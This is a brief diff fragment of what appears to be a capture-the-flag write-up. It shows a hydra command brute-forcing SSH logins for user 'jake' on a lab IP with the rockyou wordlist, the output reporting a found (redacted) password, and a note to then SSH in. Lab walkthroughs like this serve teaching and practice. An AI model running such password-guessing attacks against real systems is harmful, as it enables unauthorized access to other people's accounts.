@@ -48,7 +48,9 @@ Jake please change your password. It is too weak and holt will be mad if someone
 so weak password huh? 
 ``
 fredi@index:~$ hydra -l jake -P wordlists/rockyou.txt ssh://10.10.239.250 -t 20
+
 attacking ssh://10.10.239.250:22/
+
 [22][ssh] host: 10.10.239.250   login: jake   password: <redacted>
 ``
 Then ssh into the machine.
